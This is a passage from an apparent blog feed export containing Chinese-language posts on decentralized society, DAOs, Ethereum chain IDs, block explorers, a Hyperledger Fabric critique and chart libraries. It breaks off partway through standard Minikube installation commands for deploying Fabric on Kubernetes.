<h4 id="9-3-原始灵魂"><a href="#9-3-原始灵魂" class="headerlink" title="9.3 原始灵魂"></a>9.3 原始灵魂</h4><p>规范也可以引导灵魂存在。当我们重新考虑代币和钱包时，我们还可以重新定义我们对某些类别的 NFT 和旨在表明会员资格的代币的看法。特别是，我们可以引入不转让由知名机构颁发的反映会议出席情况、工作经验或教育证书的 NFT 和 POAP 的规范。这种会员代币的转移——如果进行价值交易——可能会降低钱包的声誉，并可能阻止发行人进一步向该钱包发行会员或 POAP 代币。已经在非托管生态系统中，大量用户已经获得了显着的财务声誉和钱包中的股份，这可以作为有效的抵押品，让他们不滥用不可转让性期望。</p>
<p>虽然所有这些途径都有各自的挑战，但我们希望各种方法能够通过一小部分步骤增加在中期收敛到我们的准平衡状态的机会。</p>
<blockquote>
<h3 id="§10-CONCLUSION"><a href="#§10-CONCLUSION" class="headerlink" title="§10 CONCLUSION"></a>§10 CONCLUSION</h3><p>As ambitious as we have been in imagining what DeSoc could enable, in many ways the above are just first steps. There is more than one road to DeSoc, including a number of non-blockchain based frameworks, such as Spritely, ACDC and Backchannel that rely on data stores tied to local machines rather than global ledgers. These frameworks may eventually o￾er even greater trust across social distance, because they can harness transitivity of trust relationships—like trusted introductions—rather than relying on SBTs issued by well-known, high-status institutions (like universities or DAOs). Furthermore the applications we describe above are just the beginning of what DeSoc can empower, not touching virtual worlds: their physics, society, and their complex intersection with the physical world. All this suggests that even the broad ambitions we paint above are just the beginning of what DeSoc may eventually become. </p>
<p>On that path, however, many challenges and open questions remain. The above sketches require extensive red teaming and many of them are more suggestive than fully prescriptive. How can DAOs maintain their publicity of state while thoughtfully comparing patterns of Souls and correlations in SBTs to enforce Sybil protections and decentralization? How incentive compatible is acquiring SBTs in face of various schemes of correlation discounting? How much does privacy conflict with correlation discounting and other DeSoc mechanism designs? How can we measure inequality in a social and yet appropriately private (contextually integral) manner? How should inheritance work in the community recovery framework? Are there red lines that can be drawn or even baked into protocols to avoid dystopian scenarios? Or should we simply race to build the best scenarios first? These questions are just the beginning of what we expect to be a research agenda spanning years that will co-evolve with the DeSoc ecosystem.</p>
<p>Yet the potential that DeSoc offers seems not just worth the price of navigating these tricky challenges, but perhaps necessary to ensure our survival. Albert Einstein told the 1932 disarmament conference that the failures of the “organizing power of man” to keep pace with “his technical advances” had put a “razor in the hands of a 3-year-old child.” In a world where his observation seems more prescient than ever, learning how to program futures that encode sociality—rather than writing over trust—seems a required course for human life on this planet to persist.</p>
</blockquote>
<p>尽管我们一直在想象 DeSoc 可以实现什么，但在许多方面，上述只是第一步。通往 DeSoc 的道路不止一条，包括许多基于非区块链的框架，例如 Spritely、ACDC 和 Backchannel，它们依赖于与本地机器而不是全局分类帐相关的数据存储。这些框架最终可能会在社交距离上提供更大的信任，因为它们可以利用信任关系的传递性——比如受信任的介绍——而不是依赖于知名的高地位机构（如大学或 DAO）发布的 SBT。此外，我们上面描述的应用程序只是 DeSoc 能够增强能力的开始，而不涉及虚拟世界：它们的物理、社会以及它们与物理世界的复杂交集。所有这些都表明，即使是我们在上面描绘的广泛野心，也只是 DeSoc 最终可能成为的开始。</p>
<p>然而，在这条道路上，仍然存在许多挑战和悬而未决的问题。上述草图需要大量的红队，其中许多比完全规范更具暗示性。DAO 如何在仔细比较 SBT 中的灵魂模式和相关性以执行 Sybil 保护和去中心化的同时保持其状态宣传？面对各种相关贴现方案，获得 SBT 的激励兼容性如何？隐私与相关折扣和其他 DeSoc 机制设计有多少冲突？我们如何以一种社会性的但又适当的私人（语境整合）方式来衡量不平等？继承在社区恢复框架中应该如何工作？是否有可以绘制甚至纳入协议的红线以避免反乌托邦情景？还是我们应该首先竞相构建最佳场景？这些问题只是我们期望的跨年研究议程的开始，该议程将与 DeSoc 生态系统共同发展。</p>
<p>然而，DeSoc 提供的潜力似乎不仅值得为应对这些棘手的挑战付出代价，而且可能是确保我们生存所必需的。阿尔伯特·爱因斯坦在 1932 年的裁军会议上说，“人的组织能力”未能跟上“他的技术进步”的步伐，这让“一个 3 岁的孩子手里拿着一把剃刀”。在一个他的观察似乎比以往任何时候都更有先见之明的世界里，学习如何编程编码社会性的未来——而不是写在信任之上——似乎是人类在这个星球上生存下去的必修课。</p>
]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>计算中文文本相似度有哪些好用的算法？</title>
    <url>/2018/12/18/%E8%AE%A1%E7%AE%97%E4%B8%AD%E6%96%87%E6%96%87%E6%9C%AC%E7%9B%B8%E4%BC%BC%E5%BA%A6%E6%9C%89%E5%93%AA%E4%BA%9B%E5%A5%BD%E7%94%A8%E7%9A%84%E7%AE%97%E6%B3%95%EF%BC%9F/</url>
    <content><![CDATA[<p>常用的算法</p>
<ol>
<li>基于词向量</li>
</ol>
<ul>
<li>余弦相似度</li>
<li>曼哈顿距离</li>
<li>欧几里得距离</li>
<li>明式距离（是前两种距离测度的推广），</li>
<li>在极限情况下的距离是切比雪夫距离</li>
</ul>
<ol start="2">
<li>基于字符的编辑距离</li>
</ol>
<ul>
<li>simhash</li>
<li>共有字符数</li>
</ul>
<ol start="3">
<li>基于概率统计</li>
</ol>
<ul>
<li>杰卡德相似系数</li>
</ul>
<ol start="4">
<li>基于词嵌入模型</li>
</ol>
<ul>
<li>word2vec/doc2vec</li>
</ul>
<p>参考：</p>
<ul>
<li><a href="http://www.cnblogs.com/daniel-D/p/3244718.html">漫谈：机器学习中距离和相似性度量方法</a></li>
</ul>
]]></content>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>解释SNARKs系列文章</title>
    <url>/2018/03/21/%E8%A7%A3%E9%87%8ASNARKs%E7%B3%BB%E5%88%97%E6%96%87%E7%AB%A0/</url>
    <content><![CDATA[<ol>
<li><a href="https://z.cash/zh/blog/snark-explain.html">解释 SNARKs 第一部分: 同态隐藏</a></li>
<li><a href="https://z.cash/zh/blog/snark-explain2.html">解释 SNARKs 第二部分: 盲法评估多项式</a></li>
<li><a href="https://z.cash/zh/blog/snark-explain3.html">解释 SNARKs 第三部分: 知识系数测试和假设</a></li>
<li><a href="https://z.cash/zh/blog/snark-explain4.html">解释 SNARKs 第四部分: 如何为可验证多项式进行盲评价</a></li>
<li><a href="https://z.cash/zh/blog/snark-explain5.html">解释 SNARKs 第五部分: 从计算到多项式</a></li>
<li><a href="https://z.cash/zh/blog/snark-explain6.html">解释 SNARKs 第六部分: 匹诺曹协议</a></li>
<li><a href="https://blog.z.cash/zh/snark-explain7/">解释 SNARKs 第七部分: 椭圆曲线配对方法</a></li>
</ol>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>认识DAO</title>
    <url>/2019/09/01/%E8%AE%A4%E8%AF%86DAO/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>人类一直在不断发明组织和增加组织的新方法，从核心家庭，部落，国家，企业到全球经济。到目前为止，最先进的组织—互联网打开了大门，在全球范围内进行实时信息交换，但互联网缺乏通用协调的经济手段和全球同步生产。区块链通过提供可靠的，开放的和可编程的账本系统，进而产生分布式自治组织（DAO）。<br>DAO是开放的，自组织的网络，由加密经济激励和自执行代码协调，围绕共同目标进行合作。在网络效应的推动下，DAO提供了适度的模式激励用于生成开放和可共享的资源（例如开源代码和音乐文件）。随着在更加开放的资源中创作，DAO可以无限扩展，同时保持其一致性和连贯性，并且在许多案例中胜过现有的公司结构。 DAO吸引了区块链领域的顶尖人才，对创造更高效，更有弹性的组织努力着。尽管如此，到目前为止他们还缺乏成功部署关键要素，特别是适当的分布式治理体系（decentralized governance system）。<br>DAOstack是DAO的操作系统。有了DAOstack，成千上万的开源创作者可以联合起来生产分散式应用程序（DApps），同时将产品中的所有权分配给有价值的贡献者。人们可以合作拥有和管理排名系统，与TripAdvisor或YouTube展开竞争。自治网络可以进行集体投资或保险基金。我们相信DAO将从根本上改变人们组织的方式，从初创公司到公司，非营利组织甚至民族国家。 DAOstack开发了所需的基本元素实现向未来的过渡。<br>我们将描述DAO的未来：一种不对称的，反竞争的，可扩展的合作（将来定义如下）。后面的内容将探讨区块链，特别是DAO治理的主题。</p>
<p>良好组织和协调大量个人的能力是最大的力量和社会驱动力之一，经历了数千年的不断演变。在本章中我们将描述当今传统组织面临的挑战，以及一种新的可能形式的网络组织：DAO。</p>
<h3 id="传统组织"><a href="#传统组织" class="headerlink" title="传统组织"></a>传统组织</h3><p>代理商的合作提高了其对外部竞争市场力量的效率。这是公司的基本起源以及组织希望发展的原因。但是，协调代理商随着组织的发展需要增加协调成本，这就是组织无法无限期发展的原因。<br>在组织发展时，组织需要更加严格的结构，因此面临越来越大的挑战：a）保持对快速变化的条件的敏捷性；b）保持利益，信任和利益的一致性，以及其成员之间的互动。简而言之，组织越大，所需的内部摩擦就越难应付；组织越小，内部的摩擦也越小，外部竞争就越大。公司的实际规模通常是这两种力量之间的最佳平衡点。<br>偶尔，新技术或范式转换可以减少协调成本，将组织的规模和效率提升到新的水平。它触发了机构内部和机构之间的过渡工作和业务，以及此后的社会变革，就像众包和互联网本身被发明时的情况一样。<br>互联网允许在全球范围内进行开放，实时和点对点的信息交换。因此，互联网媒体已经比传统媒体更具有可扩展性，而且速度很快同化了后者。但是，互联网本身并不支持开放的，点对点的价值交换和通用协调，因此限制其推动全球合作的潜力。</p>
<h3 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h3><p>区块链是第二次互联网革命，为信息和媒体互联网在价值和商业方面做出了贡献。通过解决信息信任问题，它可以实现前所未有的人群协调水平。从而形成分布式自治组织（DAO）的技术基础。 DAO是一种可扩展，自组织合作的新形式，由区块链运营的智能合约相协调。笔者认为DAO对未来商业大有希望，尽管围绕这一主题的区块链社区有很多贡献，但DAO的运作基础仍然缺失，成功的治理体系仍然处于探索的初期。</p>
<h3 id="代理商"><a href="#代理商" class="headerlink" title="代理商"></a>代理商</h3><p>DAO的构建块是聪明的公司或代理商（我们将交替使用这些术语）。一个智能代理是一个原子治理单位，通过智能合约进行管理和运营区块链。它有自己的令牌（与公司资源的利益相关），自己的声誉系统（与公司事务的可信度和影响力有关），以及自己的治理体系（其“章程”编码在智能合约中）。<br>嵌入在智能合约中的治理协议可以是任何人都可以想到的。一个简单的例子是基于提案的治理系统，对所需的提案进行是/否多数表决批准和执行（这成为智能公司的单一行动）。提案可能与令牌有关，例如，分配和投票可以由选民声誉加权。在启发式可视化中，它可能如下所示：</p>
<p><img src="/2019/09/01/%E8%AE%A4%E8%AF%86DAO/gov_sample.png"></p>
<p>实心球代表公司的代理商；他们与中心的距离反映了他们的影响力，或者声誉（他们越接近他们的影响越大）；他们的规模反映了他们的本土代币占比（球越大，他们持有的公司代币就越多）。一个代理商建议分配5个ETH<br>代理A为她修复bug XXX的宝贵贡献。公司代理人投票表决由他们的声誉加权，并且一旦大多数声誉持有者同意该提议，智能合约自动执行其令牌分配。</p>
<h3 id="DAOs"><a href="#DAOs" class="headerlink" title="DAOs"></a>DAOs</h3><p>代理商在区块链上运行智能合约。它们遵循无法破解的可验证规则并且只能根据规则本身进行更改。他们可能是也可能不是自治的，这取决于他们选择的治理体系；例如，一个机构可以自行保留另一个机构的决策否决权。</p>
<p>DAO是一个无中心的代理网络，它本身也是一个代理机构，不受任何一点控制。它不是中央管理，代理商之间存在间接协调，在生物学中也称为共识主动性（stigmergy），由激励机制和代码触发。DAO是一个自组织实体，<br>而且大体上更像是有机体而不是组织。</p>
<h4 id="扩展性"><a href="#扩展性" class="headerlink" title="扩展性"></a>扩展性</h4><p>所有传统组织的一个共同因素是”可扩展的“。这意味着随着决策数量的增长，传统组织的效率会越低。自由市场，互联网和基于网络效应的应用程序（如Facebook和Airbnb）都是“超级可扩展”结构 - 随着成员和交互的增长而变得更加有效。有了这个术语，DAO是一个“超级可扩展的组织”，它可以提高效率，敏捷性和可扩展性的自由市场，同时保持创业公司的一致性和追求可扩展任务的能力。</p>
<h4 id="网络拓扑结构"><a href="#网络拓扑结构" class="headerlink" title="网络拓扑结构"></a>网络拓扑结构</h4><p>有各种各样的权力下放模式，因此可以考虑各种模式将DAO放入一个机构。考虑DAO的常见方法是组装模式：</p>
<p><img src="/2019/09/01/%E8%AE%A4%E8%AF%86DAO/asm.png"></p>
<p>在DAO的组装模式中，大量代理在单个决策中进行交互。代理商通过其智能合约，假设声誉和决策权力是公平分配的。尽管是最简单的，但这种模式本身就具有可扩展性，并且对其处理有限制能力，同时保持弹性。</p>
<p><img src="/2019/09/01/%E8%AE%A4%E8%AF%86DAO/federal.png"></p>
<p>以及联邦模式，由大量的分布式的组织治理合作连接为联邦共同体。</p>
<h3 id="开放组织"><a href="#开放组织" class="headerlink" title="开放组织"></a>开放组织</h3><p>目前的世界经济体系是一个基于近似零和或输赢的游戏。通过竞争引发了向最高绩效的演变，但绩效是相对于本地而言最大化而不是全球的胜利。 （即，一家公司在自身生存方面做出优化，而不是一个更大的整体在利益方面做出优化。这是非合作纳什均衡的问题。<a href="https://baike.baidu.com/item/%E7%BA%B3%E4%BB%80%E5%B9%B3%E8%A1%A1">纳什均衡</a>的意思是这样的，在一个博弈过程中，无论对方的策略选择如何，当事人一方都会选择某个确定的策略，则该策略被称作支配性策略。这是一个大规模协调的问题，阻止了<br>从竞争转向合作的可能。</p>
<p>一个常见的例子是代码；它永远不会消耗，而且相反，眼睛越多，代码越好（也越安全）。与此同时，公司没有动力开源他们的代码，否则他们将不对称地给他们的竞争对手带来好处。在另一方面，显然，如果有十家竞争公司生产类似的产品，他们都可以从中受益，共同生产其产品的共享元素，而不是全部独立生产它们。这个难题可能在制药行业（例如电影《我不是药神》中反应的问题）也最为显着。</p>
<p>知识产权（IP）是将反竞争资源转化为稀缺元素的传统手段，它们可以销售，但它在今天的加速步伐中变得越来越不明智，也越来越不实用。</p>
<p>开放共享资源与当前经济不一致。但另一方面，它是非常大规模的，开放式的协作，并以DAO的基础。为了更加有效，DAO需要激励和奖励共享可重用组件。结果，更多现有的可共享组件将支持增长和DAO的有效性。开放组织是从目前非合作纳什转变的手段，平衡未来的合作国家。但是，DAO将取代现有的公司结构，因为他们更好或更道德，更简单，且更有效。</p>
<p>以上内容来自：<a href="https://daostack.io/">https://daostack.io</a> 的白皮书。笔者认为 DAO 会在未来的经济合作模式中占有一席之地。</p>
]]></content>
      <tags>
        <tag>DAO</tag>
      </tags>
  </entry>
  <entry>
    <title>跨链的核心技术点</title>
    <url>/2020/11/16/%E8%B7%A8%E9%93%BE%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E7%82%B9/</url>
    <content><![CDATA[<h3 id="共识穿透"><a href="#共识穿透" class="headerlink" title="共识穿透"></a>共识穿透</h3><p>我们先来给共识穿透下个定义， 共识穿透是指两条不同共识的区块链，如何从共识层打通，让两条链互联有无，最终实现共识跨链。</p>
<p>共识穿透有两种路径</p>
<p>1.从点对点网络层着手，直接和共识交互。 </p>
<p>2.从交易入手，通过交易输入到区块链共识。</p>
<p>共识穿透是选择 “出块”共识实施，还是在“确认块”共识实施较好呢？当然是在“确认块”实施有意义，因为跨链交互产生的区块或者交易信息，必须是确认的。</p>
]]></content>
  </entry>
  <entry>
    <title>适合以太坊作为联盟链的监控项目</title>
    <url>/2019/05/06/%E9%80%82%E5%90%88%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%BD%9C%E4%B8%BA%E8%81%94%E7%9B%9F%E9%93%BE%E7%9A%84%E7%9B%91%E6%8E%A7%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<h3 id="1-blockscout-成熟度-五星"><a href="#1-blockscout-成熟度-五星" class="headerlink" title="1.blockscout 成熟度 五星"></a>1.blockscout 成熟度 五星</h3><p><a href="https://github.com/poanetwork/blockscout">https://github.com/poanetwork/blockscout</a></p>
<p>A tool for inspecting and analyzing EVM based blockchains. Blockchain explorer for Ethereum networks. 开发语言采用 erlang</p>
<p><img src="/2019/05/06/%E9%80%82%E5%90%88%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%BD%9C%E4%B8%BA%E8%81%94%E7%9B%9F%E9%93%BE%E7%9A%84%E7%9B%91%E6%8E%A7%E9%A1%B9%E7%9B%AE/blockscout.gif"></p>
<h3 id="2-explorer-成熟度-五星"><a href="#2-explorer-成熟度-五星" class="headerlink" title="2.explorer 成熟度 五星"></a>2.explorer 成熟度 五星</h3><p><a href="https://github.com/carsenk/explorer">https://github.com/carsenk/explorer</a></p>
<p><img src="/2019/05/06/%E9%80%82%E5%90%88%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%BD%9C%E4%B8%BA%E8%81%94%E7%9B%9F%E9%93%BE%E7%9A%84%E7%9B%91%E6%8E%A7%E9%A1%B9%E7%9B%AE/carsenkexplorer.png"></p>
<h3 id="3-EthVM-成熟度-二星"><a href="#3-EthVM-成熟度-二星" class="headerlink" title="3.EthVM 成熟度 二星"></a>3.EthVM 成熟度 二星</h3><p><a href="https://github.com/EthVM/EthVM">https://github.com/EthVM/EthVM</a></p>
<p><img src="/2019/05/06/%E9%80%82%E5%90%88%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%BD%9C%E4%B8%BA%E8%81%94%E7%9B%9F%E9%93%BE%E7%9A%84%E7%9B%91%E6%8E%A7%E9%A1%B9%E7%9B%AE/ethvm.png"></p>
<p>EthVM is an open-source Blockchain Explorer focused mainly on <a href="https://www.ethereum.org/">Ethereum</a> (although other networks and forks will be supported over time) under the <a href="https://www.mongodb.com/licensing/server-side-public-license">SSPL license</a> (a small variation of the GNU Affero License v3) and written in a mixture of different languages.</p>
<p>You can use EthVM as a tool to explore your custom private network or the existing public ones or as a ETL (Extract, Transform, Load) platform to perform different analysis on the data.</p>
<p>本人很看好 EthVM 项目，他还结合了 ETL 的功能。希望 EthVM 项目可以越办越好。</p>
<h3 id="4-Aleth-成熟度-五星"><a href="#4-Aleth-成熟度-五星" class="headerlink" title="4.Aleth 成熟度 五星"></a>4.Aleth 成熟度 五星</h3><p><a href="https://aleth.io/">https://aleth.io/</a></p>
<p>Lite version in <a href="https://github.com/Alethio/ethereum-lite-explorer">here</a> , lite version don’t have any database, it is a live website. </p>
<p><img src="/2019/05/06/%E9%80%82%E5%90%88%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%BD%9C%E4%B8%BA%E8%81%94%E7%9B%9F%E9%93%BE%E7%9A%84%E7%9B%91%E6%8E%A7%E9%A1%B9%E7%9B%AE/lite-explorer.png"></p>
]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>详述ethereum中ChainID和NetworkID</title>
    <url>/2019/03/22/%E8%AF%A6%E8%BF%B0ethereum%E4%B8%ADChainID%E5%92%8CNetworkID/</url>
    <content><![CDATA[<ul>
<li><p>ChainID和NetworkID有什么不同？<br>ChainID在<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-155.md">EIP-155</a>中有介绍，当NetworkID都为1时，ChainID来防止在ETH和ETC之间的replay attacks—重放攻击。</p>
</li>
<li><p>ChainID和NetworkID在没有个区块中都需要标识吗？还是只在genesis block创世区块中标识？</p>
<p>ChainID通常是需要的。例如在为txs签名时，这样才能将ETH和ETC的tx区分开来。在<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-155.md">EIP-155</a>之前，为txs签名时需要NetworkID。</p>
</li>
<li><p>目前ChainID和NetworkID有哪些已经被使用？</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="right">CHAIN_ID</th>
<th align="center">Chain(s)</th>
</tr>
</thead>
<tbody><tr>
<td align="right">1</td>
<td align="center">Ethereum mainnet</td>
</tr>
<tr>
<td align="right">2</td>
<td align="center">Morden (disused), Expanse mainnet</td>
</tr>
<tr>
<td align="right">3</td>
<td align="center">Ropsten</td>
</tr>
<tr>
<td align="right">4</td>
<td align="center">Rinkeby</td>
</tr>
<tr>
<td align="right">5</td>
<td align="center">Goerli</td>
</tr>
<tr>
<td align="right">42</td>
<td align="center">Kovan</td>
</tr>
<tr>
<td align="right">1337</td>
<td align="center">Geth private chains (default)</td>
</tr>
</tbody></table>
<p>###在<a href="https://chainid.network/">https://chainid.network/</a>中有更加详细的介绍。</p>
<p>##参考链接：</p>
<p><a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-155.md">https://github.com/ethereum/EIPs/blob/master/EIPS/eip-155.md</a></p>
]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>选型fabric作为联盟链时需要考虑的几个问题</title>
    <url>/2020/01/17/%E9%80%89%E5%9E%8Bfabric%E4%BD%9C%E4%B8%BA%E8%81%94%E7%9B%9F%E9%93%BE%E6%97%B6%E9%9C%80%E8%A6%81%E8%80%83%E8%99%91%E7%9A%84%E5%87%A0%E4%B8%AA%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>参考链接==&gt;<a href="https://thenextweb.com/podium/2019/05/05/ibms-hyperledger-isnt-a-real-blockchain-heres-why/">https://thenextweb.com/podium/2019/05/05/ibms-hyperledger-isnt-a-real-blockchain-heres-why/</a></p>
<p><strong>选型 Hyperledger Fabric 作为联盟链需要考虑的几个细节问题</strong></p>
<p>1.区块链的智能合约语言如何安全、简单地表达出复杂的业务逻辑？<br>2.那些目光长远的企业还会考虑到被选择的区块链将来能否可以轻松地与其他公有区块链或私有区块链进行互操作？</p>
<p>3.如何保证公钥签名的有效性？</p>
<p>4.扩展性，升级性如何？</p>
<p><strong>Hyperledger Fabric是如何工作的</strong></p>
<p>区块链的核心是一个去中心化的不可篡改的账本，账本中存储着事件或者交易，而往账本中加入哪些数据完全由共识机制来决定。在比特币和以太坊这样的公有区块链中，这种共识是通过工作量证明或称“挖矿”来实现的。在许可区块链中，参与者提供密码学签名来对共识的内容进行投票，从而达成共识。无论是哪种方式，都不会有中央机构进行干预。</p>
<p><img src="/2020/01/17/%E9%80%89%E5%9E%8Bfabric%E4%BD%9C%E4%B8%BA%E8%81%94%E7%9B%9F%E9%93%BE%E6%97%B6%E9%9C%80%E8%A6%81%E8%80%83%E8%99%91%E7%9A%84%E5%87%A0%E4%B8%AA%E9%97%AE%E9%A2%98/1.jpeg"></p>
<p>在 Hyperledger Fabric 所提供 API 的帮助下，一笔交易要经过如下步骤：</p>
<p>1）一笔交易预提案被提交后；2）由背书节点（ endorsing peer ）通过智能合约语言 chaincode 执行它的逻辑，同时它会查询状态数据库并生成要使用到的读写集（ RWset ）；3）之后它还会连同生成的读写集返回交易预提案的回应；4）接下来，系统会将带有读写集的交易预提案提交；5）Ordering服务会把一批次的交易加入到区块中；6/7）所有的节点都会收到订购服务发来的区块信息，但它们需要验证区块中的交易信息来保证区块链中数据的安全性。</p>
<p><strong>结论一：共识过程无容恶、容错能力</strong></p>
<p>在上述的第4步是有Application（SDK）端发出的。而Application相比区块链节点更加不容易被信赖。例如，Application可在一个交易背书成功的情况下，不将交易完成第4步，即不提交给到Orderer；Application也可在一个交易背书成功的情况下，适时（延迟）再行提交给到Orderer；Application也可在一个交易背书成功的情况下，再行将后续背书成功的交易先行提交，前序交易在其后再行提交。凡此等等，都使其无法防止恶意交易、错误交易。</p>
<p><strong>结论二：Channel 设计带来的复杂性远远高于可用性，Private data 设计无容恶和容错能力</strong></p>
<p>Hyperledger Fabric 使用 channel（通道）来保证参与者之间的隐私性。这种隐私性是私有“企业”区块链的一个重要特性，但它必然会带来一些折衷，也会大大增加区块链的复杂性。但从企业区块链需要的可拓展性方面来说，多链解决方案并不是一个好的选择，因为这样做会使得部署过程太过于复杂、节点分布不均匀、智能合约不可靠、还会大大增加潜在的故障点。且，合约无法跨 channel 执行，channel 内的数据形成了新的数据孤岛。</p>
<p>在 2.0 版本中，Private data相关交易在事先配置好的参与方内使用，交易通过达到签名门限数量决定该交易是否通过。门限数设置较高，则无法具备容错能力；门限数设置较低，则无法证实其容恶能力。</p>
<p><strong>结论三：随着网络的扩展，交易延迟加重，网络性能堪忧</strong></p>
<p>从根本上来说 Hyperledger Fabric 的架构根本无法在保持最佳性能的同时进行扩展。在 2.0 版本中，Orderer 集群从 Kafka&amp;Zookeeper 切换至 raft，将改善 Orderer 集群的多中心部署，但交易延迟没有改善。Hyperledger Fabric 区块链在部署之后的性能指标并不尽如人意，随着节点的增加性能还会迅速下降，而且它所宣称的性能是单通道时的性能：如果你想跨过多个通道与整个区块链网络进行交互，这些所谓的性能指标没有任何意义。</p>
<p>对于每个独立的通道，区块链的每秒处理交易量很难突破800这个大关，但即使是拥有16个通道配置的区块链也几乎不能达到1500TPS，若区块链一直维持吞吐量上限运行，其延迟时间可能会达到10到20秒。</p>
<p>最近一些旨在加快 Hyperledger Fabric 运行速度的研究使得其每秒处理交易量能达到惊人的20000，但性能大幅度提升的背后是研究人员对 Hyperledger Fabric 架构的大规模“魔改”，这使得 Hyperledger Fabric 已经成一个近似的区块链变成了一个四不像：背书节点（Endorsers）不再充当验证者而 Kafka 被认定为唯一可行的订购服务。最后，这些仍然只是单通道的性能，这意味着它与区块链作为共享可信来源的整个理念相违背。</p>
<p><strong>结论四：Chaincode与其执行环境的安全性低</strong></p>
<p>Hyperledger Fabric 的智能合约（称为链码“Chaincode”）可以用多种编程语言编写，其中包括常见的 Javascript 语言以及 Go 语言。但使用开发人员十分了解的通用编程语言开发是一把双刃剑，它在大大简化开发过程的同时，在安全性方面与专为区块链开发的编程语言相比大大弱化。</p>
<p>在这时如果代码有缺陷或不正确（因为它不是专为区块链设计的）那么可能会造成数百万美元的损失。因此我们认为智能合约语言必须专为区块链设计且为安全性做出了优化。Chaincode 在这几个方面可谓是彻彻底底地失败了，我们发现被誉为开发人员的第一个程序 “Hello World” 在其他语言中仅需几行就可以实现，而在 Chaincode 中居然需要150行之多。代码越多，可能存在的漏洞就越多。这么大数量的代码中可能隐藏着很多能造成数百万美元损失的漏洞。甚至在 Chaincode 的执行环境中可以发送 http request，将合约运行中的运行变量值发送给到任意客户端。</p>
<p>实际上，Hyperledger Fabric 以及 R3 Corda 都因为架构的完全不兼容而与公有区块链切割开来，这里面也有智能合约的责任，因为它们的智能合约语言无法在公有区块链和私有区块链中无缝切换。联盟链更加希望自己的资产可以对公有区块链上的客户使用，部署在公有区块链上的去中心化应用程序也会希望将隐私数据存储在联盟区块链中。</p>
<p>更多参考内容==&gt;<a href="http://www.chinaz.com/blockchain/2019/1125/1067365.shtml">http://www.chinaz.com/blockchain/2019/1125/1067365.shtml</a></p>
<p>与 IBM 的 Hyperledger 不同，Quorum 的区块链要简单得多，但在为保密交易构建架构时，它仍然面临着复杂性问题。现在，Quorum 的几个关键开发人员已经离开团队，去开发新的区块链项目，使用 Quorum 的客户是否会获得强大的支持，这仍有待观察。</p>
<p>也许让 Quorum 面临最大风险的是，这项技术是由一家大银行管理，而不是一家专门的技术公司。对摩根大通来说，Quorum 永远是一种产品，而不是其核心业务。</p>
]]></content>
      <tags>
        <tag>产品设计</tag>
      </tags>
  </entry>
  <entry>
    <title>金融应用客户端的图表库</title>
    <url>/2024/08/16/%E9%87%91%E8%9E%8D%E5%BA%94%E7%94%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E5%9B%BE%E8%A1%A8%E5%BA%93/</url>
    <content><![CDATA[<ol>
<li><p>免费开源版本，图标库 -<br><a href="https://github.com/plotly/plotly.js">https://github.com/plotly/plotly.js</a><br><a href="https://github.com/apache/echarts">https://github.com/apache/echarts</a><br>如下图中的 Price Performance Widget：<br><img src="/2024/08/16/%E9%87%91%E8%9E%8D%E5%BA%94%E7%94%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E5%9B%BE%E8%A1%A8%E5%BA%93/1.png"></p>
</li>
<li><p>付费商业版本，图标库 -<br><a href="https://devexperts.com/dxcharts/">https://devexperts.com/dxcharts/</a><br><img src="/2024/08/16/%E9%87%91%E8%9E%8D%E5%BA%94%E7%94%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E5%9B%BE%E8%A1%A8%E5%BA%93/2.png"></p>
</li>
</ol>
<p>看到，收费版本最大的优势 - 可以在图标中画线，做进一步的个性化的分析。</p>
<p>另外，再推荐一下 OPENBB - <a href="https://www.openbb.co/">https://www.openbb.co/</a> ，目前已经将ChatGPT作为投资研究的一种工具，整合进到OPENBB （ <a href="https://www.youtube.com/watch?v=Uj_wpLC-Zho">https://www.youtube.com/watch?v=Uj_wpLC-Zho</a> ）。</p>
]]></content>
      <tags>
        <tag>架构</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>部署fabric于k8s之上</title>
    <url>/2021/08/09/%E9%83%A8%E7%BD%B2fabric%E4%BA%8Ek8s%E4%B9%8B%E4%B8%8A/</url>
    <content><![CDATA[<h3 id="hyperledger-fabric-2-2-kubernetes"><a href="#hyperledger-fabric-2-2-kubernetes" class="headerlink" title="hyperledger fabric 2.2 kubernetes"></a>hyperledger fabric 2.2 kubernetes</h3><h3 id="一、本地开发环境依赖"><a href="#一、本地开发环境依赖" class="headerlink" title="一、本地开发环境依赖"></a>一、本地开发环境依赖</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Minikube 安装 v1.20.0</span></span><br><span class="line">curl -Lo minikube https://kubernetes.oss-cn-hangzhou.aliyuncs.com/minikube/releases/v1.20.0/minikube-darwin-amd64</span><br><span class="line">chmod +x minikube</span><br><span class="line">sudo mv minikube /usr/local/bin/</span><br><span class="line"><span class="meta">#</span><span class="bash"> Minikube start</span></span><br><span class="line">minikube start --image-mirror-country cn \</span><br><span class="line">    --iso-url=https://kubernetes.oss-cn-hangzhou.aliyuncs.com/minikube/iso/minikube-v1.20.0.iso 